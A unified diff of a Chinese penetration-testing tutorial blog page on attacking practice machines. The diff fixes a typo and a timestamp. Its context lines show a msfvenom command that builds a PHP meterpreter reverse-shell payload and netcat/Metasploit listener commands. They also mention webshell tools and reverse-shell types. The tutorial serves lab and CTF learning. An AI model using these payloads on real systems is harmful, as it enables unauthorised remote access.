@@ -14,7 +14,7 @@
 <meta property="og:description" content="靶机渗透是渗透实战的一个缩影。 图示 准备1、个人准备： 12345web安全基础Linux基础kali基础CTF基础渗透基础  2、环境准备： kali+SecQuan 3、靶机准备： 靶机可在Vulnerable或HTB下载 分层常见靶机一般按照其内容可以划分成三层：web层、主机层和数据库层。（web层和数据库层其实可以归为服务层） 划分的目的是为了更好地在渗透的过程中，特别是在陷入难点的时">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;penetration-test1&#x2F;image-20191201151716428.png">
-<meta property="og:updated_time" content="2019-12-01T12:17:15.265Z">
+<meta property="og:updated_time" content="2019-12-01T12:45:18.369Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;penetration-test1&#x2F;image-20191201151716428.png">
     
@@ -222,7 +222,7 @@
 
 <p>这种方式需要注意的是菜刀或蚁剑的终端只是虚拟终端，最好还是利用工具的其他功能，拿到一个真正的shell。</p>
 <p>2、reverse-shell的方式：</p>
-<p>通过特定漏洞，例如命令注入等，以kali作为接受端，执行反弹shell的命令，从而进入系统。</p>
+<p>通过特定漏洞，例如命令注入等，以kali作为接收端，执行反弹shell的命令，从而进入系统。</p>
 <p>以reverse-shell的方式有3种类型：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash类型</span><br><span class="line">nc类型</span><br><span class="line">编程语言类型如python、php、ruby等</span><br></pre></td></tr></table></figure>
 
@@ -242,8 +242,8 @@
 <p>msf也可生成：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=client_ip lport=client_port -f raw -o re-shell.php</span><br></pre></td></tr></table></figure>
 
-<p>以kali作为接受端也有2种方式：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp port</span><br><span class="line">msf的接受shell模块 exploit/mutil/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+<p>以kali作为接收端也有2种方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp port</span><br><span class="line">msf的接收shell模块 exploit/mutil/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
 
 <p><a href="https://www.cnblogs.com/p0pl4r/p/10643541.html" target="_blank" rel="noopener">参考</a></p>
 <p>有时候需要用到python将终端转为tty形式：</p>
